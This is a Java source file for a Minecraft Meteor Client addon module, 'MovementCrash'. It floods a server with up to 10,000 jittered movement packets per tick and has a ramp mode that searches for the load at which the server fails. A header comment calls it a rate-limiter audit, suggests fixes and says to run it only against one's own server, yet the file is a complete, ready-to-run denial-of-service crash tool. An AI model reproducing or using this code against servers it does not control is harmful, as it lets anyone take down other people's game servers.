package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

/**
 * AUDIT: Movement Crash (high-rate jittered position flood)
 *
 * Sends full position+rotation packets (PlayerMoveC2SPacket.Full) at up to
 * 10,000 per tick, each with a small random jitter on position and random
 * yaw/pitch. Tests the raw inbound movement packet rate limiter.
 *
 * The key question is whether the server processes ALL N packets per tick
 * (validating position, checking AC, updating entity tracking) or whether
 * it rate-limits before the expensive work. If it processes all N, CPU cost
 * is linear in N; if it limits to 1–2 per tick, N has no additional cost.
 *
 * Patch signal: accept at most one authoritative movement update per tick per
 * player regardless of how many packets arrive; queue or discard excess;
 * apply wall-clock rate limits at the Netty reader stage so excess packets
 * never reach the main thread.
 *
 * Run against your OWN local server only.
 */
public class MovementCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets").description("Packets per tick.")
        .defaultValue(2000).min(1).sliderMax(10000).build()
    );
    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
        .name("ramp-mode")
        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
        .defaultValue(false).build()
    );
    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
        .name("ramp-step").description("Rate increase per tick in ramp mode.")
        .defaultValue(10).range(1, 500).sliderRange(1, 100)
        .visible(rampMode::get).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoMonitor = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-monitor")
        .description("Auto-enable Server Health Monitor to track TPS impact while this module runs.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int currentRate = 1;

    private final Random random = new Random();

    public MovementCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "movement-crash",
            "Spams full move packets with jittered position/rotation. Tests movement packet rate limiting.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; currentRate = 1;
        if (autoMonitor.get()) {
            var shm = Modules.get().get(ServerHealthMonitor.class);
            if (shm != null && !shm.isActive()) shm.toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        int rate = rampMode.get() ? currentRate : packets.get();
        if (rampMode.get()) currentRate += rampStep.get();
        Vec3d pos = mc.player.getEntityPos();
        for (int i = 0; i < rate; i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                pos.x + jitter(1), pos.y + jitter(1), pos.z + jitter(1),
                (float) (random.nextDouble() * 90), (float) (random.nextDouble() * 180),
                true, false));
            packetsSent++;
        }
    }

    private double jitter(double rad) {
        return random.nextDouble() * rad - (rad / 2);
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
